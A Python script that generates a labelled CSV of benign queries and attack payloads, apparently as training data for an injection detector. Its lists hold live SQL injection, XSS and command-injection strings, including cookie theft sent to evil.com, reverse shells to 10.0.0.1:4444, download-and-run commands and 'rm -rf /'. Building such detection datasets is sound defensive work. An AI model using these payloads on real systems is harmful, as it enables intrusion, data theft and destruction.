import csv
import random

def generate_dataset(output_file, size=1000):
    """Generate a larger dataset with real-world examples"""
    
    # Real-world patterns
    benign_queries = [
        "SELECT * FROM products WHERE category = 'electronics' LIMIT 10",
        "INSERT INTO orders (user_id, product_id) VALUES (?, ?)",
        "UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?",
        f"SELECT price FROM items WHERE id = {random.randint(1,1000)}",
        "<div class='user-profile'>Welcome back, {username}!</div>",
        "curl -I https://api.example.com/status",
        "git clone https://github.com/user/repo.git",
        "npm install express",
        "SELECT COUNT(*) FROM logs WHERE date > '2023-01-01'",
        "docker run nginx"
    ]
    
    sql_injection = [
        "' OR '1'='1",
        "admin' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT username,password FROM admin_users --",
        "'; exec xp_cmdshell('net user'); --",
        "' OR 1=1 ORDER BY 1--",
        "')) OR 1=1--",
        "admin' AND 1=CONVERT(int,@@version)--",
        "'; WAITFOR DELAY '0:0:10'--",
        "' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--"
    ]
    
    xss = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "javascript:alert(document.domain)",
        "<iframe src='javascript:alert(`xss`)'></iframe>",
        "<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>",
        "<script>fetch('https://evil.com?c='+document.cookie)</script>",
        "<img src=1 href=1 onerror='javascript:alert(1)'></img>",
        "<body onload=alert('XSS')>",
        "<input onfocus=write(1) autofocus>"
    ]
    
    cmd_injection = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "; wget http://malicious.com/shell.php",
        "& net user administrator /add",
        "; nc -e /bin/bash 10.0.0.1 4444",
        "`curl http://evil.com/script.sh | sh`",
        "|| echo 'evil' > script.sh",
        "; python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'",
        "& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1')",
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    ]

    with open(output_file, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['id', 'payload', 'label'])
        
        # Generate dataset with specified distribution
        for i in range(size):
            if i % 100 < 60:  # 60% benign
                payload = random.choice(benign_queries)
                label = 'benign'
            elif i % 100 < 75:  # 15% SQL injection
                payload = random.choice(sql_injection)
                label = 'sql_injection'
            elif i % 100 < 90:  # 15% XSS
                payload = random.choice(xss)
                label = 'xss'
            else:  # 10% command injection
                payload = random.choice(cmd_injection)
                label = 'cmd_injection'
                
            writer.writerow([i+1, payload, label])

if __name__ == "__main__":
    generate_dataset('large_dataset.csv')